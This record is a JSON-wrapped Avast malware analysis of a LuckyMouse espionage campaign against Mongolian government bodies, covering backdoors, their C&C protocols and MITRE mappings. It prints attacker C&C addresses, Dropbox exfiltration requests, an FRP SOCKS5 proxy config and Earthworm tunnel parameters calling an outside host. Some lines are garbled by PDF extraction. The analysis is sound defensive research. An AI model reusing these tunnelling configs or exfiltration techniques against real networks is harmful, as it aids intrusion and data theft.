{
    "id": "fb67f11f-8234-44e5-b945-2fe09cd70d0a",
    "created_at": "2023-01-12T15:01:03.087862Z",
    "updated_at": "2025-03-27T02:15:45.313433Z",
    "deleted_at": null,
    "sha1_hash": "966243ed23d2ed6443e3e87b51e74cf2474d3e8d",
    "title": "2020-12-09 - APT Group Targeting Governmental Agencies in East Asia",
    "authors": "",
    "file_creation_date": "2022-08-18T03:43:33Z",
    "file_modification_date": "2022-08-18T03:43:33Z",
    "file_size": 1072255,
    "plain_text": "# APT Group Targeting Governmental Agencies in East Asia\n\n**decoded.avast.io/luigicamastra/apt-group-targeting-governmental-agencies-in-east-asia**\n\n## Introduction\n\n\nDecember 9, 2020\n\n\nThis summer, Avast discovered a new APT campaign targeting government agencies and a National Data Center of Mongolia. We consider\nwith moderate confidence based on our research that the chinese-speaking APT group LuckyMouse is behind the attack.\n\nThe APT group planted backdoors and keyloggers to gain long-term access to government networks and then uploaded a variety of tools that\nthey used to perform additional activities on the compromised network such as scanning of the local network and dumping credentials. We\npresume that the main aim of cyber-espionage was the exfiltration of sensitive data from potentially interesting government agencies.\n\nAccording to our local telemetries, we consider that the government institutions were attacked in two ways. One was through a vulnerable\ncompany who is providing services for these agencies, and the other was through an email spear-phishing with a malicious attachment – a\nweaponized document using CVE-2017-11882.\n\nThere are many tactics that are consistent with other reports of LuckyMouse; nevertheless, we are also seeing some previously undocumented\ntactics indicating that the actors have updated their toolset with Polpo and LuckyBack backdoors. Our analysis below will highlight those new\ntactics.\n\n## Attribution & Clusterization\n\nWe base our presumption that this campaign was led by the LuckyMouse APT group on the tooling that we found during the investigation of\n[this campaign, most of them having previously been attributed to LuckyMouse by other researchers[1][2][3].](https://securelist.com/luckymouse-hits-national-data-center/86083/)\n\nIn 2018, Kaspersky Labs released two blog posts about LuckyMouse targeting a national data center containing Asian government resources.\nTheir blog posts described several tool sets such as network filtering driver NDISProxy, weaponized documents with CVE-2017-11882\n(Microsoft Office Equation Editor, widely used by Chinese-speaking actors), and Earthworm tunneler. They also described a DLL sideloading\ntechnique abusing legitimate applications from Symantec (IntgStat.exe). This is a legitimate application that loads a DLL pcalocalresloader.dll.\nBy sideloading their own version pcalocalresloader.dll, they load HyperBro RAT from a compressed and encrypted file thumbs.db. While some\nof the tools that were used were publicly known tools that are available on the internet, the group also developed their own tools, including a\n[rootkit[1][2].](https://securelist.com/luckymouse-hits-national-data-center/86083/)\n\nIn April 2019, PaloAlto Networks released a blogpost about LuckyMouse. According to the post, the group installed webshells on a SharePoint\nserver to compromise Government Organizations in the Middle East. Similarly, the group used several publicly known and available tools (such\nas mimikatz, curl, ntbscan). But what got our attention was the fact that the same HyperBro RAT was used in the campaign we were analyzing.\nThe APT attack we analyzed also used a DLL sideloading technique, although with different executables. The executable used was a\nSymantec application thinprobe.exe that loads thinhostprobedll.dll. This DLL was then used to sideload thumb.db that contained encrypted and\n[compressed HyperBro[3].](https://unit42.paloaltonetworks.com/emissary-panda-attacks-middle-east-government-sharepoint-servers/)\n\nWe’ve also discovered a Polpo backdoor in the network belonging to the National Data Center of Mongolia. This backdoor was accompanied\nby samples that are known to be used by the LuckyMouse group which lead us to the conclusion that this backdoor is a new addition into\nLuckyMouse’s toolkit. We also observed more common tools, e.g. VMProtect-obfuscated Earthworm tunneler, a custom installer dropping\nNDISProxy network filtering driver, and various network scanners.\n\n## Infection Chain\n\nWe observed that this APT group was also targeting an unknown company that was providing services to government institutions in East Asia.\nThe group infiltrated the company’s computers and managed to harvest credentials belonging to the company’s email accounts. Unfortunately,\nwe haven’t been able to identify which attack vector was used in this infiltration These credentials were then used to send emails from the\n\n\n-----\n\nac ed co pa y s e a accou ts to t e go e e t o c a s e e e e u ab e to eco e t e o e e a, e e a aged to eco e\nthe email’s header. The header indicates that these emails were asking the recipient to update a firmware, i.e. launch a self-extracting 7-zip\narchive attached to this email.\n\nDate: Sun, 28 Jun 2020 20:43:08 +0800 (ULAT)\n\nSubject: Re: Perform a firmware update on the server\n\nXXXXXX_update.exe\n\n(sha256:2D2EA3002C367684F21AD08BDC9B5079EBDEE08B6356AC5694EFA139D4C6E60D)\n\nThis archive drops three already familiar files – Symantec’s thinprobe.exe, malicious thinhostprobedll.dll, and thumb.db. The malicious DLL is\nused for DLL sideloading, decrypting and decompressing thumb.db and finally loading its processed content – a HyperBro RAT . This\n[backdoor has also been reported on by Kaspersky[1] and](https://securelist.com/luckymouse-hits-national-data-center/86083/) [PaloAlto Networks[3], the latter providing an extensive description of the HyperBro](https://unit42.paloaltonetworks.com/emissary-panda-attacks-middle-east-government-sharepoint-servers/)\nRAT.\n\nFigure 1: Overview of infection\n\nvector\n\n## Toolset\n\nIn this following section we describe a tool set we found on the victim’s PC, used by the APT group for cyber-espionage and lateral movement\nthrough the network. We could divide these tools into three categories:\n\nHelpers: ServiceInstaller, ShellCodeExecutor, DataExtractor 1/2, Information Collector\nRemote access: StartServiceTool, Korplug, LuckyBack, BlueTraveller, Polpo\nPublicly available tools: UAC bypass tool, port scanners, password dumpers, FRP, Earthworm tunneler\n\nIn detail, we found the following tools:\n\n## StartServiceTool\n\nThis tool installs wcm.dll into %WINDIR%\\system32, a registry record\n\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WindowsConnections Manager\n\nis created with the following values:\n\nDescription: Makes automatic connect/disconnect decisions based on the network connectivity options currently available to the PC and\nenables management of network connectivity based on Group Policy settings\n\n\n-----\n\nsp ay a e do s Co ect o s a age\n\nServiceDll: C:\\Windows\\system32\\wcm.dll.\n\nThis effectively creates a new service. The dropped binary is a 32-bit service DLL that has two parts – embedded DLL, and mmLoader\n[(http://tishion.github.io/mmLoader/), a loader that bypasses the windows loader.](http://tishion.github.io/mmLoader/)\n\nThe final payload DLL is written in GO and contains a single export named “Interface“. This function expects 4 arguments consisting of two\nstrings and their corresponding lengths. The string values specify the victim ID and the Dropbox API key to use. The API key is passed in as\nan RC4 encrypted + base64 encoded value.\n\nThe hardcoded decryption key is “0000111122223333“. The DLL additionally contains a default API key which appears to be for the authors\ntest account.\n\nInitially, it tries do download a file from Dropbox via the HTTP API:\n\nPOST /2/files/download HTTP/1.1\n\nHost: content.dropboxapi.com\n\nUser-Agent: Go-http-client/1.1\n\nContent-Length: 0\n\nAuthorization: Bearer [snipped]\n\nDropbox-Api-Arg: {“path”: “/infos/000000.txt”}\n\nAccept-Encoding: gzip\n\nIf the server responds with a file, it tries to upload a file with a timestamp and a hostname onto Dropbox:\n\nPOST /2/files/upload HTTP/1.1\n\nHost: content.dropboxapi.com\n\nUser-Agent: Go-http-client/1.1\n\nContent-Length: 36\n\nAuthorization: Bearer [snipped]\n\nContent-Type: application/octet-stream\n\nDropbox-Api-Arg: {“path”: “/infos/116a0d.txt”,”mode”: “overwrite”,”autorename”: true,”mute”: false,”strict_conflict”: false}\n\nAccept-Encoding: gzip\n\n%currentDate% %currentTime%##%hostname%\n\nAfterwards, a C&C request-response loop is started. Based on the response from the C&C server, one of the following commands is executed:\ndownload files, upload files, sleep, quit, or execute commands on a command line. See the following diagram for a detailed flow, keep in mind\nthat all download/upload are using the aforementioned Dropbox API:\n\n\n-----\n\nFigure 2: Overview of detailed execution flow\n\n## ServiceInstaller\n\nWe assume that this installer is intended to be executed by one of the aforementioned backdoors as it requires command-line parameters for\nits successful execution:\n\nSwitch Argument\n\n-i path of DLL to install as a service\n\n-u Uninstall a specific service name\n\nAt first, security descriptors of both %windir%\\system32\\ and %windir%\\system32\\drivers\\ changes to allow the current user to copy files to\nthese locations. Then the installer copies a service executable to %windir%\\system32\\ under a randomly generated name (4 alphanumeric\ncharacters).\n\nDepending on whether a service named DFS Replication already exists in\n\nHKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost netsvcs,\n\na new service called DFS Replication (if it does not exist) or IAS Jet Database Access Service %number% is created. More specifically, its\nparameters are:\n\nDescription: “Configures Internet Authentication Service (IAS). If this service is stopped, the remote network access that requires user\n_authentication will be unavailable. If this service is disabled, any services that explicitly depend on it will fail to start or (Retail) Replicates files_\n_among multiple PCs keeping them in sync. On Client, it is used to roam folders between PCs; on the server, it is used to provide high_\n_availability and local access across a wide area network (WAN). If the service is stopped, file replication does not occur, and the files on the_\n_server become out-of-date. If the service is disabled, any services that explicitly depend on it will not start.”_\nDisplayName: DFS Replication/IAS Jet Database Access Service %number%\n\nServiceDll: C:\\Windows\\system32\\<4 random alphanumeric characters>.dll.\n\nTag: 0\n\nSecurity: 0\n\n## ShellCodeExecutor\n\nThis utility takes hex-encoded shellcode as an argument and then proceeds to execute it. The code responsible for decoding and unpacking\ncan be seen below:\n\n\n-----\n\nFigure 3: Decoding algorithm and\n\nexecuting decoded payload in allocated memory\nWhile we weren’t able to reconstruct which stage this executor was used, we were able to recover its parameter that corresponds to a hex[encoded metasploit-generated shellcode (reverse HTTP proxy – Github configured to connect to URL oss.chrome-upgrade[.]com](https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_reverse_https_proxy.asm)\n(202.59.9[.]58). We suspect that the threat actors used the shellcode just to retrieve and execute a further stage from the C&C server.\n\n## DataExtractor 1\n\nThis tool can be used to gather potentially sensitive documents with pdf, ppt, xls, and doc file extensions. It recursively scans all connected\ndrives for such documents that were modified in 2020 and later. Gathered documents are packed using Winrar and the archive is protected\nwith a password “zaq1xsw@cde3”. This archive will be then saved to C:\\MSBuild\\NVIDIA\\ under a filename CRYPTO-%computerName%_%number_value%.SYS. This scan is repeated every 20 minutes. If this tool is launched a second time (e.g. after reboot), only documents that_\nwere modified in the last 24 hours are gathered.\n\nAfter each run, a file %windir%\\system32\\igfxme.vbs is executed. Since this tool did not contain any exfiltration-related functionality, we\npresume that this script is used to exfiltrate the archive from the computer to a C&C. Unfortunately, we were not able to recover this script.\n\n## DataExtractor 2\n\nThis binary is a simple filescanner that is provided with a list of file extensions, a list of directories, and date boundaries as parameters. Every\ndirectory from the list is searched for files with a given file extension. If such files are found and their modification date is within the provided\ndate boundaries (in UTC), their full paths are written down into the output file. These paths are delimited by Windows line delimiters and they\nare encoded in 16-bit Unicode.\n\nBelow you will see a part of an error message, providing us the information about how this utility is used:\n\n_T040ClientLite.exe suffix .txt,.xls scanDirs E:\\\\test,E:\\\\test1 output E:\\\\test\\\\output.txt startEditDate 2020/04/26 endEditDate 2020/04/27_\n\nMore generally, the command’s format is:\n\n_T040ClientLite.exe suffix <file extensions> scanDirs <directories> output <output file> startEditDate <date> endEditDate <date>_\n\n## Information Collector\n\n\n-----\n\ne o at o Co ecto ocuses o e o ab e d es o suc d es a e co ected, ts e ecut o s te ated e co ecto ge p ts\nthose drives (serial number, vendor ID, product ID), encrypts this data with a 64 byte XOR key, and stores it onto the system drive as hidden\nfiles. More specifically, it uses the following directories:\n\n_C:\\MSBuild\\Resources\\Format\\S-1-1 (encrypted files)_\n\n_C:\\MSBuild\\Resources\\Format\\S-1-0\\S-1-0-0 (unencrypted temporary files, deleted after encryption)_\n\n_Figure 4: Sample enumerate drives, checking their type with_\n\n_GetDriveTypeA_\n_It ensures its persistence by adding itself into Run (SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run) registry key under AvpSecurity._\n\nInterestingly, it contains many unused functions using command-line tools such as: systeminfo, arp, ipconfig, netstat, and tasklist. It also\nsupports archiving the collected information using WinRAR with a hard-coded password “1qaz@WSX”. The sample has no networking\ncapabilities. It primarily serves for collecting the information and transferring the gathered information using removable drives between the\nmachines in the network.\n\nMoreover, the particular sample we analyzed contained a bug in the drives’ enumeration routine that made it virtually useless as it hampered\nall the sample’s functionality.\n\n## RAT\n\n### Korplug (PlugX)\n\nKorplug (PlugX) is a well-known Remote Access Trojan associated with Chinese speaking attackers and it has been used in a large number of\n[targeted attacks since 2012[4]. It uses DLL side-loading to load itself into the memory through legitimate applications. It helps it stay unnoticed](https://www.welivesecurity.com/2014/11/12/korplug-military-targeted-attacks-afghanistan-tajikistan/)\nby any security product. Korplug is a fully featured RAT, with capabilities such as file uploads, downloads, keystroke logging, webcam control\nand access to a remote cmd.exe shell.\n\nIn our case, we observed that it was loaded through an application provided by ESET called unsecapp.exe that was signed with a valid, but\nexpired certification. After executing unsecapp.exe, it loads a malicious DLL http_dll.dll. This DLL, in turn, decrypts http_dll.dat with a custom\nalgorithm, yielding Korplug which is then loaded into the memory and executed. Unfortunately, we were not able to trace the RAT back to the\noriginal payload that dropped and executed these files.\n\nAddress of C&C servers:\n\nweb[.]microlynconline[.]com:80\n\nhome[.]microlynconline[.]com:8000\n\nhelp[.]microlynconline[.]com:443\n\nhost[.]microlynconline[.]com:53\n\n## Backdoors\n\n\n-----\n\ne ou d t ee d e e t bac doo s t e go e e t o ce et o, t o o c, o o a d uc y ac, e e e e see a y p e ous\ncampaign. Polpo also hits the National Data Center, and the two others, BlueTraveller and LuckyBack, only hit the government office network.\n\n### LuckyBack\n\nLuckyBack collects the computer’s fingerprint, at first, and then tries to establish a communication with the C&C server (45.77.55[.]145). Once\nthe communication is established, the backdoor starts listening for commands. It is capable of: starting a remote shell, file manipulation (move,\nread, write, execute, get file size), keylogging, and screen capturing.\n\n**Technical:**\n\nAt first, the used code page is retrieved by calling chcp, a command providing the keyboard and character set information, on the system drive.\n\nThe first request on the C&C server “registers” the device by providing its fingerprint. Namely, the fingerprint is constructed from: PID, Windows\nversion/build number, CPU architecture, username, user privileges, hostname, IP address, code page, and RDP session ID.\n\nIf the server accepts the registration, it responds with the PID and a simple string “OK”. Afterwards, a simple request-response C&C loop is\nstarted, and commands and their corresponding numbers are displayed in the table below:\n\n**Commands** **Functions**\n\n0x70, 0x72 Receive data again\n\n0x1, 0x11 Creates remote shell or quit remote shell\n\n0x2 File size and last write from spec. file\n\n0x3 It’s reads data from specific offset and file\n\n0x4 Gets file size\n\n0x12 Delete spec. file\n\n0x13 Terminate specific thread\n\n0x14 Receiving reading configuration\n\n0x22 Execute %command% via CreateProcess API\n\n0x23 Set a reading configuration for 0x3 command\n\n0x24 Writes data to specific file\n\n0x32 File operations (move file from one location to another)\n\n0x50 Start keylogging\n\n0x51 Stop keylogging\n\n0x60 Take screenshot\n\n### BlueTraveller\n\nThis backdoor is simpler in terms of commands than the previous one. It accepts just four commands: exit, upload, download, and execute on\nthe command line. Nevertheless, it uses two layers of C&C servers, meaning that the first request is on the first layer, and it yields an IP\naddress of a C&C server from the second layer. Afterwards, the request-response C&C loop uses the second layer. If the backdoor receives a\ncommand for the command line, the output from the console is encrypted with AES-256 and sent back to the second-layer C&C server.\n\nThe binary itself has its strings encrypted with RC4, using a hardcoded key “L!Q@W#E$R%T^Y&U*A|}t~k”. Among these strings, we may find\nthe address of the first-layer C&C server and the user agent that should be used for these requests. Our sample tried to contact\n[http://go.vegispaceshop[.]org/shop.htm. The response seems to be pretty inconspicuous at first glance. But once we have a look more closely,](https://decoded.avast.io/luigicamastra/blank)\nwe see that many lines are followed by a mixture of tabs and spaces,which is rather fishy indeed. And surprisingly this is where the IP address\nof the second C&C layer hides!\n\n\n-----\n\nFigure 5:\n\n\nResponse from first layer of C&C server\n\n\n-----\n\nFigure 6: Script which decrypts\n\nthe white spaces from the html response\nThe BlueTraveller uses the same scheme for encryption – AES-256 with a key derived from a string that is hashed with SHA-256, providing the\nIV and the key. The first usage of this encryption is in the first request to the second-layer C&C. For this first request, the key is derived from a\nstring “0304276cf4f31345“. The key is then used to encrypt the generated GUID and the computer’s hostname which are then Base64encoded and used to generate the request URL:\n\n_http://<second_layer_C&C>/home/<rand number>/<enc_length>/<Base64 data>._\n\nAfter this request is executed, commands are retrieved from:\n\n_http://<second_layer_C&C>/index.htm._\n\nThe obtained data is encrypted with AES-256, using the aforementioned approach with GUID as a base-string for the key-derivation\nprocedure. Each response also contains the random number that was sent in the first second-layer request. The malware checks whether the\nreceived number matches the one it sent; in case of a mismatch, the command is discarded. If a command for the command line is received,\nthe output of the executed command (AES-256 encrypted, using the same key as the previous response, and Base64 encoded) is sent to\n\nhttp://<second_layer_C&C>/help/<rand number>/<enc_length>/<Base64 data>.\n\n### Polpo\n\nPolpo is a backdoor that we’ve been seeing in the wild since 2018. It supports around 15 different commands including information collection\nand exfiltration, file transfer, and proxy connections.\n\nBase64 IP\n\nMjAzLjkxLjExOS40OjgwMDA= 203.91.119[.]4:8000\n\nMjAyLjE3OS4wLjE0Mjo4MDgw 202.179.0[.]142:8080\n\n\n-----\n\nMjAyLjE3OS41LjE2MTo0NDM= 202.179.5[.]161:443\n\nBase64-encoded addresses of C&C servers are hard-coded in the binary\n\n**Polpo – Communication**\n\nThe backdoor mimics the HTTP protocol to blend with the normal traffic. The transferred data is encrypted with AES and encoded into Base64\nthen sent as a part of fake HTML content.\n\nFigure 7: Command data parsing\n\nThe AES encryption key is derived from the first packet of each new command received from the C&C server, using the algorithm below:\n\nFigure 8: Encryption key computation\n\nThe sample checks for a proxy configured on the system found in the Registry Key Software\\Microsoft\\Windows\\CurrentVersion\\Internet\n_Settings\\ProxyEnable. If a proxy is configured it uses the server specified in Software\\Microsoft\\Windows\\CurrentVersion\\Internet_\n_Settings\\ProxyServer for all the connections._\n\n**Polpo – Functionality**\n\nThere are more than 15 commands supported by the backdoor, although some of them are duplicates. Most of the commands are executed in\nseparate threads. Errors and inter-thread communication are handled using Events.\n\nFigure 9: Command dispatcher\n\nThese commands are supported by the version of Polpo we’ve analyzed:\n\n**Main commands** **Sub commands** **Functions**\n\n0x1FFFFFF Initialize CLI Interface\n\n0x101FFFF CLI Spawn CMD.EXE\n\n0x102FFFF CLI Write Data To File\n\n\n-----\n\n0x103FFFF CLI List Directory\n\n0x104FFFF CLI ShellExecuteW(0, “Open”, Cmd, 0, 0)\n\n0x106FFFF CLI Change Directory\n\n0x107FFFF CLI Delete File\n\n0x2EEEEEE Commands\n\n0x201EEEE Enumerate Drives Info\n\n0x202EEEE Enumerate Files\n\n0x203EEEE Send File To C&C\n\n0x204EEEE Write Data To File\n\n0x 205EEEE Run Default App\n\n0x206EEEE Shell Execute Open\n\n0x207EEEE Delete File\n\n0x208EEEE Delete Files Recursive\n\n0x3DD03DD Serve As Proxy (Hide As Http)\n\n0x30103DD Get Data To Transfer\n\n0x3DDDDDD Serve As Proxy (Raw Data)\n\n0x5FFFFFF Close Connection\n\n0x60AAAAAA Close Connection\n\n0x70BBBBBB Reboot\n\n0x80CCCCCC Shutdown System\n\n0xAFFFFFF Send File To C&C\n\n## UAC bypass tool\n\n[An open-source UAC bypass tool (https://github.com/vestjoe/WinPwnage) was detected on several compromised devices. It may be used to](https://github.com/vestjoe/WinPwnage#uac-bypass-techniques)\nelevate privileges or achieve persistence on the system. We presume that it was used to execute tasks and programs under administratorlevel permissions.\n\n## Port-scanners\n\nSeveral different port scanners were seen on compromised devices under various filenames. One of the used port scanners was open-source\n[https://github.com/kingron/s. We assume that in this case it was used for scanning the ports of the server to find out which services were](https://github.com/kingron/s)\nrunning.\n\n## Nbtscan\n\nNbtscan is a command-line NetBIOS scanner for Windows that scans for open NetBIOS name servers in the network.\n\n## Passwords dumpers\n\n[Mimikatz and](https://github.com/gentilkiwi/mimikatz) [Lazagne were seen on the infected computers. We presume that they were used to retrieve credentials from the compromised](https://github.com/AlessandroZ/LaZagne)\n[computers. We’ve also spotted a wrapped Mimikatz version, download from https://github.com/jas502n/mimikat_ssp, on several compromised](https://github.com/jas502n/mimikat_ssp)\ndevices.\n\n## FRP\n\nFast Reverse Proxy (FRP) is a tool that allows you to expose local services that are hidden behind the NAT or a firewall to the internet. Both\nthe raw TCP and UDP are supported as well as several other protocols whose requests can be forwarded to the internal services via this\nproxy. We’ve recovered a configuration file 3bef4cd.tmp for this proxy. The content of this proxy is the following:\n\n\n-----\n\n[co o ]\nserver_addr = 202.59.9[.]58\n\nserver_port = 8443\n\nprivilege_token = %token%\n\n[SDJY_proxy]\n\ntype = tcp\n\nremote_port = 6001\n\nplugin = socks5\n\nIt is immediately obvious that the actor used the SOCKS5 plugin to route requests to the compromised network via 202.59.9[.]58:8443.\n\nFigure 10: Diagram of FRP tool\n\nusage\n\n## Earthworm tunneler\n\nThe Earthworm tunneler is considered to be a typical tool for Chinese-speaking actors by Kaspersky[1]. We’ve seen this tool on all\ncompromised systems of national data center. On one of these devices, we’ve managed to recover command-line parameters that were used:\n_-s rssocks -d 139.180.155.133 -e 80. The tool itself creates a SOCKS tunnel to the provided server. It is publically available at_\n[http://rootkiter.com/EarthWorm/.](http://rootkiter.com/EarthWorm/)\n\n## Conclusions\n\nAs this blogpost demonstrates, LuckyMouse has used new methods to infiltrate the government institution through a third party’s system which\nthey attacked.\n\nAvast has recently protected users in the government institution and national data center from further attacks using the samples we analyzed.\nWe also discovered an interesting encryption method that delivers a hidden IP address in the whitespace of the C&C response. We presume\nthat the attackers updated their attacking toolset in this campaign after it was discovered by Avast.\n\nI would like to thank Adolf Středa, David Zimmer and Anh Ho for helping me with this research.\n\n## Indicators of Compromise (IoC)\n\n[Repository: https://github.com/avast/ioc/tree/master/](https://github.com/avast/ioc/tree/master/LuckyMouse)\nList of SHA-256: [https://github.com/avast/ioc/blob/master/](https://github.com/avast/ioc/blob/master/LuckyMouse/samples.sha256)\n\n## MITRE ATT&CK techniques\n\n\n-----\n\n**Tactic** **ID** **Name** **Comment**\n\n\nInitial\nAccess\n\n\nT1199 Trusted Relationship Sending emails from hacked trusted email accounts\n\n\nT1566.001 Spear\nPhishing\nAttachment\n\n\nEmails with malicious documents and\nsoftware updates\n\n\nExecution T1059.003 Windows Command Shell\n\nT1204.002 Malicious File\n\n\nT1203 Exploitation\nfor Client\nExecution\n\n\nDocuments weaponized with CVE-201711882 – Equation Editor\n\n\nT1106 Native API Windows API CreateProcessW\n\nPersistence T1547.001 Registry Run Keys Using\n“SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\AvpSecurity\n\n\nT1543.003 Create or\nModify\nSystem\nProcess:\nWindows\nService\n\n\nMultiple samples create services for\npersistence\n\n\nPrivilege\nEscalation\n\n\nT1548.002 Bypass User Access Control WinPwnage tool\n\n\nT1543.003 Create or\nModify\nSystem\nProcess:\nWindows\nService\n\n\nInstalls services in:\n“HKLM\\SYSTEM\\CurrentControlSet\\Services\\”\n\n\nDefense\nEvasion\n\n\nT1574.002 Hijack Execution Flow: DLL Side-Loading HyperBro was loaded,decrypted, decompressed and executed by\na legitimate application using this technique.\n\n\nT1564.001 Hidden Files\nand\nDirectories\n\nT1027 Obfuscated\nFiles or\nInformation\n\n\nHiding collected information in hidden\ndirectories and files\n\nCollected information is encrypted using byte\nXOR operation\n\n\nT1218.011 Rundll32 Executing shell code\n\n\nT1218 Signed\nBinary Proxy\nExecution\n\n\nthinprobe.exe (Symantec), unsecapp.exe\n(ESET)\n\n\nCredential\nAccess\n\n\nT1003.001 LSASS Memory Mimikatz\n\n\nT1552 Unsecured\nCredentials\n\n\nLasagne\n\n\n-----\n\nDiscovery T1083 File and Directory Discovery Search for sensitive documents with extensions pdf, ppt, xls, doc\n\n\nT1046 Network\nService\nScanning\n\nT1120 Peripheral\nDevice\nDiscovery\n\nT1082 System\nInformation\nDiscovery\n\n\nused publicly available tools “nbtscan” and\nport scanner “s”\n\nSearching for removable drives on the system\n\n\nLateral\nMovement\n\n\nT1091 Replication Through Removable Media Information Collector is capable of copying binary files to\nremovable drives\n\n\nCollection T1560.001 Archive Collected Data: Archive via Utility hides exfiltrated documents in password-protected .rar archives.\n\nT1119 Automated\nCollection\n\n\nT1056.001 Input\nCapture:\nKeylogging\n\n\nUsed in LuckyBack backdoor\n\n\nCommand\nand Control\n\n\nT1071.001 Application Layer Protocol: Web Protocols Polpo: HTTP is used for communications with C2\n\n\nT1132.001 Data\nEncoding:\nStandard\nEncoding\n\nT1573.001 Encrypted\nChannel:\nSymmetric\nCryptography\n\nT1104 Multi-Stage\nChannels\n\nT1090.001 Proxy:\nInternal\nProxy\n\n\nPolpo: Encrypted data is encoded as Base64\n\nPolpo: Transfered data is encrypted with AES\n\nBlueTraveller: multiple C&C servers are used\n\nPolpo: serves as proxy in the network\n\n\nExfiltration T1052.001 Exfiltration Over Physical Medium: Exfiltration\nover USB\n\n\nInformation Collector moves files in the network over removable\ndrives\n\n\nT1567.002 Exfiltration\nOver Web\nService:\nExfiltration to\nCloud\nStorage\n\nT1041 Exfiltration\nOver C2\nChannel\n\n## References\n\n\nStartServiceTool: Dropbox is used for\nexfiltration of collected data\n\nPolpo exfiltrated data to C&C server\n\n\n\n[1] [https://securelist.com/luckymouse-hits-national-data-center/86083/](https://securelist.com/luckymouse-hits-national-data-center/86083/)\n\n\n-----\n\n[ ] ttps //secu e st co / uc y [ouse](https://securelist.com/luckymouse-ndisproxy-driver/87914/) d sp o y d e /8 9 /\n\n[3] [https://unit42.paloaltonetworks.com/emissary-panda-attacks-middle-east-government-sharepoint-servers/](https://unit42.paloaltonetworks.com/emissary-panda-attacks-middle-east-government-sharepoint-servers/)\n\n[4] [https://www.welivesecurity.com/2014/11/12/korplug-military-targeted-attacks-afghanistan-tajikistan/](https://www.welivesecurity.com/2014/11/12/korplug-military-targeted-attacks-afghanistan-tajikistan/)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-12-09 - APT Group Targeting Governmental Agencies in East Asia.pdf"
    ],
    "report_names": [
        "2020-12-09 - APT Group Targeting Governmental Agencies in East Asia.pdf"
    ],
    "threat_actors": [
        {
            "id": "b740943a-da51-4133-855b-df29822531ea",
            "created_at": "2022-10-25T15:50:23.604126Z",
            "updated_at": "2025-03-27T02:00:55.505366Z",
            "deleted_at": null,
            "main_name": "Equation",
            "aliases": [
                "Equation"
            ],
            "source_name": "MITRE:Equation",
            "tools": null,
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "e3492534-85a6-4c87-a754-5ae4a56d7c8c",
            "created_at": "2022-10-25T15:50:23.819113Z",
            "updated_at": "2025-03-27T02:00:55.552554Z",
            "deleted_at": null,
            "main_name": "Threat Group-3390",
            "aliases": [
                "Threat Group-3390",
                "Earth Smilodon",
                "TG-3390",
                "Emissary Panda",
                "BRONZE UNION",
                "APT27",
                "Iron Tiger",
                "LuckyMouse"
            ],
            "source_name": "MITRE:Threat Group-3390",
            "tools": [
                "Systeminfo",
                "gsecdump",
                "PlugX",
                "ASPXSpy",
                "Cobalt Strike",
                "Mimikatz",
                "Impacket",
                "gh0st RAT",
                "certutil",
                "China Chopper",
                "HTTPBrowser",
                "Tasklist",
                "netstat",
                "SysUpdate",
                "HyperBro",
                "ZxShell",
                "RCSession",
                "ipconfig",
                "Clambling",
                "pwdump",
                "NBTscan",
                "Pandora",
                "Windows Credential Editor"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "2c980ea7-04c4-4193-8535-52f87e66a96e",
            "created_at": "2024-05-01T02:03:07.994126Z",
            "updated_at": "2025-03-27T02:05:17.293799Z",
            "deleted_at": null,
            "main_name": "BRONZE UNION",
            "aliases": [
                "Budworm ",
                "Emissary Panda ",
                "Iron Tiger ",
                "Lucky Mouse ",
                "TG-3390 ",
                "Temp.Hippo ",
                "APT27 "
            ],
            "source_name": "Secureworks:BRONZE UNION",
            "tools": [
                " ASPXSpy",
                " China Chopper",
                " Enfal",
                " Gh0st RAT",
                " HttpBrowser",
                " Hunter",
                " HyperBro",
                " OwaAuth",
                " PlugX",
                " PoisonIvy",
                " Sysupdate",
                " ZxShell",
                "9002"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "4ae78ca3-8bc8-4d67-9df1-a85df250a8a0",
            "created_at": "2024-10-08T02:00:04.469211Z",
            "updated_at": "2025-03-27T02:00:03.437849Z",
            "deleted_at": null,
            "main_name": "TaskMasters",
            "aliases": [
                "BlueTraveller"
            ],
            "source_name": "MISPGALAXY:TaskMasters",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "c63ab035-f9f2-4723-959b-97a7b98b5942",
            "created_at": "2023-01-06T13:46:38.298354Z",
            "updated_at": "2025-03-27T02:00:02.798255Z",
            "deleted_at": null,
            "main_name": "APT27",
            "aliases": [
                "TG-3390",
                "EMISSARY PANDA",
                "TEMP.Hippo",
                "Budworm",
                "Group 35",
                "BRONZE UNION",
                "Lucky Mouse",
                "Iron Taurus",
                "GreedyTaotie",
                "Red Phoenix",
                "ZipToken",
                "Iron Tiger",
                "G0027",
                "Earth Smilodon"
            ],
            "source_name": "MISPGALAXY:APT27",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "5c13338b-eaed-429a-9437-f5015aa98276",
            "created_at": "2022-10-25T16:07:23.582715Z",
            "updated_at": "2025-03-27T02:02:09.875151Z",
            "deleted_at": null,
            "main_name": "Emissary Panda",
            "aliases": [
                "APT 27",
                "ATK 15",
                "Bronze Union",
                "Budworm",
